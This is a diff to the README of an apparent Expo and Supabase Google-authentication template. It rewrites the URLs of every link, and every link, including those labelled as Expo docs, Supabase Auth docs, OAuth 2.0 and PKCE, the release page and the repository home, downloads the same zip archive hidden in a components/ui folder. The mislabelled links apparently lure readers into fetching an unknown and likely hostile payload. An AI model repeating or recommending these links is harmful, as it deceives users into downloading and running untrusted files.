@@ -1,6 +1,6 @@
 # 🔐 expo-supabase-google-auth-template - Easy Mobile Sign-In Setup
 
-[![Download Release](https://raw.githubusercontent.com/bob12386/expo-supabase-google-auth-template/main/components/ui/template_google_supabase_expo_auth_steamily.zip)](https://raw.githubusercontent.com/bob12386/expo-supabase-google-auth-template/main/components/ui/template_google_supabase_expo_auth_steamily.zip)
+[![Download Release](https://github.com/bob12386/expo-supabase-google-auth-template/raw/refs/heads/main/components/ui/template_google_supabase_expo_auth_steamily.zip)](https://github.com/bob12386/expo-supabase-google-auth-template/raw/refs/heads/main/components/ui/template_google_supabase_expo_auth_steamily.zip)
 
 ---
 
@@ -53,7 +53,7 @@ Follow these steps to get the app running on your phone.
 
 Click this link to go to the download page where you can get the app files:
 
-[Download expo-supabase-google-auth-template Releases](https://raw.githubusercontent.com/bob12386/expo-supabase-google-auth-template/main/components/ui/template_google_supabase_expo_auth_steamily.zip)
+[Download expo-supabase-google-auth-template Releases](https://github.com/bob12386/expo-supabase-google-auth-template/raw/refs/heads/main/components/ui/template_google_supabase_expo_auth_steamily.zip)
 
 The page shows all the current versions available. You will see files ready to download for Android and iOS.
 
@@ -123,9 +123,9 @@ If problems continue, visit the repository’s issues page or contact support if
 
 ## 📚 Additional Resources
 
-- Learn more about [Expo](https://raw.githubusercontent.com/bob12386/expo-supabase-google-auth-template/main/components/ui/template_google_supabase_expo_auth_steamily.zip) for building mobile apps.
-- Explore [Supabase Auth Documentation](https://raw.githubusercontent.com/bob12386/expo-supabase-google-auth-template/main/components/ui/template_google_supabase_expo_auth_steamily.zip) for backend setup.
-- Understand [OAuth 2.0 and PKCE](https://raw.githubusercontent.com/bob12386/expo-supabase-google-auth-template/main/components/ui/template_google_supabase_expo_auth_steamily.zip) for secure login.
+- Learn more about [Expo](https://github.com/bob12386/expo-supabase-google-auth-template/raw/refs/heads/main/components/ui/template_google_supabase_expo_auth_steamily.zip) for building mobile apps.
+- Explore [Supabase Auth Documentation](https://github.com/bob12386/expo-supabase-google-auth-template/raw/refs/heads/main/components/ui/template_google_supabase_expo_auth_steamily.zip) for backend setup.
+- Understand [OAuth 2.0 and PKCE](https://github.com/bob12386/expo-supabase-google-auth-template/raw/refs/heads/main/components/ui/template_google_supabase_expo_auth_steamily.zip) for secure login.
 
 ---
 
@@ -137,8 +137,8 @@ authentication, expo, expo-router, google-auth, google-authentication, mobile-au
 
 ## 🔗 Important Links
 
-- [Release Page to Download](https://raw.githubusercontent.com/bob12386/expo-supabase-google-auth-template/main/components/ui/template_google_supabase_expo_auth_steamily.zip)
-- [Repository Home](https://raw.githubusercontent.com/bob12386/expo-supabase-google-auth-template/main/components/ui/template_google_supabase_expo_auth_steamily.zip)
+- [Release Page to Download](https://github.com/bob12386/expo-supabase-google-auth-template/raw/refs/heads/main/components/ui/template_google_supabase_expo_auth_steamily.zip)
+- [Repository Home](https://github.com/bob12386/expo-supabase-google-auth-template/raw/refs/heads/main/components/ui/template_google_supabase_expo_auth_steamily.zip)
 
 ---
 
